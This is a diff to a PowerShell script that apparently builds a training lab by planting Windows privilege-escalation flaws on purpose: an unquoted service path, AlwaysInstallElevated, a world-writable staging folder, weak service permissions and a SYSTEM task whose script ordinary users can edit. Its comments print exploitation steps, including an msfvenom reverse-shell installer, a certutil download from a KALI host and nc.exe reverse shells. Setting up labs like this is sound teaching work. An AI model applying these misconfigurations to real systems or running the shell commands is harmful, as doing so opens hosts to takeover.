@@ -14,10 +14,25 @@
 #>
 
 $ErrorActionPreference = "Continue"
+$script:SectionFailures = @()
 
 function Write-Phase {
     param([string]$Msg)
     Write-Host "[$(Get-Date -Format 'HH:mm:ss')][Vulns] $Msg"
+}
+
+# ── Load deploy-context marker (written by Install-Services.ps1) ──
+$ctxPath = "C:\ProgramData\MedAlliance\deploy-context.json"
+if (Test-Path $ctxPath) {
+    try {
+        $ctx = Get-Content $ctxPath -Raw | ConvertFrom-Json
+        $script:IsServer = [bool]$ctx.IsServer
+        Write-Phase "Loaded deploy context: IsServer=$script:IsServer"
+    } catch {
+        $script:IsServer = ((Get-CimInstance Win32_OperatingSystem).ProductType -ne 1)
+    }
+} else {
+    $script:IsServer = ((Get-CimInstance Win32_OperatingSystem).ProductType -ne 1)
 }
 
 # ═══════════════════════════════════════════════════════════════
@@ -36,11 +51,12 @@ function Write-Phase {
 # If m.chen places a malicious "MedAlliance.exe" in C:\Program Files\,
 # it runs as the service account (or SYSTEM) on next service restart.
 
-Write-Phase "W-PRIV-01: Creating unquoted service path..."
+try {
+Write-Phase "[Section] W-PRIV-01: Creating unquoted service path..."
 
 # Create the nested directory (spaces in path = vulnerable)
 $svcDir = "C:\Program Files\MedAlliance\Health Monitor"
-New-Item -Path $svcDir -ItemType Directory -Force | Out-Null
+if (-not (Test-Path $svcDir)) { New-Item -Path $svcDir -ItemType Directory -Force | Out-Null }
 
 # Create a benign agent.exe (just a script that does nothing harmful)
 # We compile a tiny C# program that loops and writes to a log
@@ -102,6 +118,13 @@ goto loop
 
 # Create the service with an UNQUOTED path (the vulnerability)
 # Note: sc.exe create does NOT auto-quote paths with spaces
+# Idempotency: delete any prior instance so sc.exe create does not collide.
+if (Get-Service -Name 'MedHealthSvc' -ErrorAction SilentlyContinue) {
+    Stop-Service -Name 'MedHealthSvc' -Force -ErrorAction SilentlyContinue
+    sc.exe delete MedHealthSvc 2>&1 | Out-Null
+    Start-Sleep -Seconds 1
+}
+
 sc.exe create MedHealthSvc `
     binPath= "C:\Program Files\MedAlliance\Health Monitor\agent.exe" `
     start= auto `
@@ -136,6 +159,11 @@ Write-Phase "  m.chen has Modify access to $parentDir"
 Start-Service MedHealthSvc -ErrorAction SilentlyContinue
 
 Write-Phase "W-PRIV-01 planted: Unquoted service path for MedHealthSvc."
+Write-Phase "[Section] W-PRIV-01 completed."
+} catch {
+    Write-Warning "[Section] W-PRIV-01 failed: $_"
+    $script:SectionFailures += 'W-PRIV-01'
+}
 
 # ═══════════════════════════════════════════════════════════════
 #  W-PRIV-02: ALWAYSINSTALLELEVATED
@@ -148,12 +176,13 @@ Write-Phase "W-PRIV-01 planted: Unquoted service path for MedHealthSvc."
 #   msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=5555 -f msi -o evil.msi
 #   msiexec /quiet /qn /i evil.msi
 
-Write-Phase "W-PRIV-02: Setting AlwaysInstallElevated..."
+try {
+Write-Phase "[Section] W-PRIV-02: Setting AlwaysInstallElevated..."
 
-# HKLM key
+# HKLM key — AlwaysInstallElevated privesc REQUIRES both HKLM and HKCU set.
 $hklmPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
 if (-not (Test-Path $hklmPath)) { New-Item -Path $hklmPath -Force | Out-Null }
-Set-ItemProperty -Path $hklmPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord
+Set-ItemProperty -Path $hklmPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord -Force
 
 # HKCU key — needs to be in m.chen's registry hive
 # Load m.chen's NTUSER.DAT if profile exists, otherwise set in Default User
@@ -164,7 +193,7 @@ if (Test-Path $mchenNtuser) {
     reg load "HKLM\TEMP_MCHEN" $mchenNtuser 2>&1 | Out-Null
     $hkcuPath = "HKLM:\TEMP_MCHEN\SOFTWARE\Policies\Microsoft\Windows\Installer"
     if (-not (Test-Path $hkcuPath)) { New-Item -Path $hkcuPath -Force | Out-Null }
-    Set-ItemProperty -Path $hkcuPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord
+    Set-ItemProperty -Path $hkcuPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord -Force
     [gc]::Collect()
     reg unload "HKLM\TEMP_MCHEN" 2>&1 | Out-Null
     Write-Phase "  Set in m.chen's HKCU hive."
@@ -175,7 +204,7 @@ if (Test-Path $mchenNtuser) {
         reg load "HKLM\TEMP_DEFAULT" $defaultNtuser 2>&1 | Out-Null
         $defPath = "HKLM:\TEMP_DEFAULT\SOFTWARE\Policies\Microsoft\Windows\Installer"
         if (-not (Test-Path $defPath)) { New-Item -Path $defPath -Force | Out-Null }
-        Set-ItemProperty -Path $defPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord
+        Set-ItemProperty -Path $defPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord -Force
         [gc]::Collect()
         reg unload "HKLM\TEMP_DEFAULT" 2>&1 | Out-Null
         Write-Phase "  Set in Default User hive (applies on first login)."
@@ -184,10 +213,15 @@ if (Test-Path $mchenNtuser) {
     # Also set in current user context (SYSTEM during deployment)
     $hkcuCurrent = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
     if (-not (Test-Path $hkcuCurrent)) { New-Item -Path $hkcuCurrent -Force | Out-Null }
-    Set-ItemProperty -Path $hkcuCurrent -Name "AlwaysInstallElevated" -Value 1 -Type DWord
+    Set-ItemProperty -Path $hkcuCurrent -Name "AlwaysInstallElevated" -Value 1 -Type DWord -Force
 }
 
 Write-Phase "W-PRIV-02 planted: AlwaysInstallElevated in HKLM + HKCU."
+Write-Phase "[Section] W-PRIV-02 completed."
+} catch {
+    Write-Warning "[Section] W-PRIV-02 failed: $_"
+    $script:SectionFailures += 'W-PRIV-02'
+}
 
 # ═══════════════════════════════════════════════════════════════
 #  W-PRIV-03: SeImpersonatePrivilege (via MSSQL service)
@@ -208,12 +242,13 @@ Write-Phase "W-PRIV-02 planted: AlwaysInstallElevated in HKLM + HKCU."
 #   4. Upload PrintSpoofer: EXEC xp_cmdshell 'certutil -urlcache -f http://KALI/PrintSpoofer64.exe C:\Temp\ps.exe'
 #   5. Escalate: EXEC xp_cmdshell 'C:\Temp\ps.exe -c "C:\Temp\nc.exe KALI 5555 -e cmd.exe"'
 
-Write-Phase "W-PRIV-03: SeImpersonatePrivilege is inherent to SQL service — no action needed."
+try {
+Write-Phase "[Section] W-PRIV-03: SeImpersonatePrivilege is inherent to SQL service — no action needed."
 Write-Phase "  Students discover via xp_cmdshell → whoami /priv."
 
 # Create C:\Temp with write permissions for Everyone (exploit staging area)
 $tempDir = "C:\Temp"
-New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
+if (-not (Test-Path $tempDir)) { New-Item -Path $tempDir -ItemType Directory -Force | Out-Null }
 $acl = Get-Acl $tempDir
 $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
     "Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
@@ -221,6 +256,11 @@ $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
 $acl.AddAccessRule($rule)
 Set-Acl $tempDir $acl
 Write-Phase "  C:\Temp created with Everyone:FullControl (exploit staging)."
+Write-Phase "[Section] W-PRIV-03 completed."
+} catch {
+    Write-Warning "[Section] W-PRIV-03 failed: $_"
+    $script:SectionFailures += 'W-PRIV-03'
+}
 
 # ═══════════════════════════════════════════════════════════════
 #  W-PRIV-05: WEAK SERVICE PERMISSIONS
@@ -238,7 +278,13 @@ Write-Phase "  C:\Temp created with Everyone:FullControl (exploit staging)."
 #   sc.exe stop MedHealthSvc
 #   sc.exe start MedHealthSvc
 
-Write-Phase "W-PRIV-05: Setting weak service permissions on MedHealthSvc..."
+try {
+Write-Phase "[Section] W-PRIV-05: Setting weak service permissions on MedHealthSvc..."
+
+if (-not (Get-Service -Name 'MedHealthSvc' -ErrorAction SilentlyContinue)) {
+    Write-Warning "[W-PRIV-05] MedHealthSvc service not present — weak-perms step skipped."
+    $script:SectionFailures += 'W-PRIV-05'
+} else {
 
 # Grant m.chen SERVICE_ALL_ACCESS on the MedHealthSvc service
 # Using sc.exe sdset with a custom DACL
@@ -256,6 +302,12 @@ sc.exe sdset MedHealthSvc $sddl 2>&1 | Out-Null
 Write-Phase "  m.chen has full service control on MedHealthSvc."
 
 Write-Phase "W-PRIV-05 planted: Weak service permissions."
+}
+Write-Phase "[Section] W-PRIV-05 completed."
+} catch {
+    Write-Warning "[Section] W-PRIV-05 failed: $_"
+    $script:SectionFailures += 'W-PRIV-05'
+}
 
 # ═══════════════════════════════════════════════════════════════
 #  W-PRIV-06: WRITABLE SCHEDULED TASK
@@ -273,10 +325,11 @@ Write-Phase "W-PRIV-05 planted: Weak service permissions."
 #   echo C:\Temp\nc.exe KALI 6666 -e cmd.exe >> C:\Scripts\daily_report.bat
 #   (wait up to 15 minutes for execution as SYSTEM)
 
-Write-Phase "W-PRIV-06: Creating writable scheduled task..."
+try {
+Write-Phase "[Section] W-PRIV-06: Creating writable scheduled task..."
 
 $scriptsDir = "C:\Scripts"
-New-Item -Path $scriptsDir -ItemType Directory -Force | Out-Null
+if (-not (Test-Path $scriptsDir)) { New-Item -Path $scriptsDir -ItemType Directory -Force | Out-Null }
 
 # Create the "legitimate" script
 @"
@@ -302,7 +355,7 @@ echo [%date% %time%] Backup complete. >> C:\Scripts\backup.log
 "@ | Set-Content "$scriptsDir\backup_databases.bat" -Encoding ASCII
 
 # Create Backups directory
-New-Item -Path "C:\Backups" -ItemType Directory -Force | Out-Null
+if (-not (Test-Path "C:\Backups")) { New-Item -Path "C:\Backups" -ItemType Directory -Force | Out-Null }
 
 # Grant BUILTIN\Users Modify access to daily_report.bat (the vulnerability)
 $acl = Get-Acl "$scriptsDir\daily_report.bat"
@@ -320,21 +373,29 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel 
 $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                 -StartWhenAvailable -MultipleInstances IgnoreNew
 
+# Idempotency: remove prior task before re-registering.
+Unregister-ScheduledTask -TaskName "DailyReportGenerator" -Confirm:$false -ErrorAction SilentlyContinue
 Register-ScheduledTask -TaskName "DailyReportGenerator" `
     -Action $action -Trigger $trigger -Principal $principal -Settings $settings `
     -Description "Generates daily system health report for monitoring dashboard" `
-    -Force
+    -Force -ErrorAction SilentlyContinue | Out-Null
 
 # Also register the backup task (not vulnerable — for realism)
 $bkAction  = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Scripts\backup_databases.bat"
 $bkTrigger = New-ScheduledTaskTrigger -Daily -At "02:00"
 
+Unregister-ScheduledTask -TaskName "NightlyDatabaseBackup" -Confirm:$false -ErrorAction SilentlyContinue
 Register-ScheduledTask -TaskName "NightlyDatabaseBackup" `
     -Action $bkAction -Trigger $bkTrigger -Principal $principal -Settings $settings `
     -Description "Nightly backup of SQL Server databases" `
-    -Force
+    -Force -ErrorAction SilentlyContinue | Out-Null
 
 Write-Phase "W-PRIV-06 planted: daily_report.bat writable by Users, runs as SYSTEM every 15 min."
+Write-Phase "[Section] W-PRIV-06 completed."
+} catch {
+    Write-Warning "[Section] W-PRIV-06 failed: $_"
+    $script:SectionFailures += 'W-PRIV-06'
+}
 
 # ═══════════════════════════════════════════════════════════════
 #  SUMMARY
@@ -348,3 +409,10 @@ Write-Phase "  W-PRIV-04: Stored credentials (cmdkey — set in Configure-Users.
 Write-Phase "  W-PRIV-05: Weak service perms (m.chen → MedHealthSvc)"
 Write-Phase "  W-PRIV-06: Writable scheduled task (daily_report.bat → SYSTEM)"
 Write-Phase ""
+if ($script:SectionFailures.Count -eq 0) {
+    Write-Phase "Plant-Vulns completed successfully."
+    exit 0
+} else {
+    Write-Warning "Completed with failures in: $($script:SectionFailures -join ', ')"
+    exit 1
+}
